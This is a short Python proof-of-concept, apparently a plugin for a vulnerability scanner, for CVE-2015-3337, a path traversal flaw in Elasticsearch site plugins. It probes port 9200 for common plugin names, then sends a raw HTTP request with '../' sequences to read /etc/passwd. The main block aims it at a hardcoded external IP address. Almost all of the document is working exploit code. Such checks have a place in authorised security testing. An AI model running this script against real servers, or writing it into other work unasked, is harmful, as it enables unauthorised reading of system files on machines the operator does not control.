#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
POC Name  : elasticsearch CVE-2015-3337 本地任意文件读取漏洞
Author    : a
mail      :a@lcx.cc
Referer   :http://www.freebuf.com/vuls/68075.html

"""
import socket
def assign(service, arg):
    if service == "ip":
        return True, arg

def audit(arg):
    port =9200
    host = arg
    pluginList = ['test','kopf', 'HQ', 'marvel', 'bigdesk' ,'head' ]
    try:
        for plugin in pluginList:     
            socket.setdefaulttimeout(3)
            s = socket.socket()
            s.connect((host,port))
            s.send("GET /_plugin/%s/ HTTP/1.0\n"
                "Host: %s\n\n" % (plugin, host))
            file = s.recv(16)
            if ("HTTP/1.0 200 OK" in file):
                grab(plugin,host,port)
                break
    except Exception:
            pass
    finally:
        s.close()
        
def grab(plugin,host,port):
    fpath = '/etc/passwd'  
    socket.setdefaulttimeout(3)
    s = socket.socket()
    s.connect((host,port))
    s.send("GET /_plugin/%s/../../../../../..%s HTTP/1.0\n"
        "Host: %s\n\n" % (plugin, fpath, host))
    file = s.recv(2048)
    if "HTTP/1.0 200 OK" in file and 'root' in file:
        security_hole('CVE-2015-3337')
if __name__ == '__main__':
    from dummy import *
    audit(assign('ip', '14.18.16.33')[1])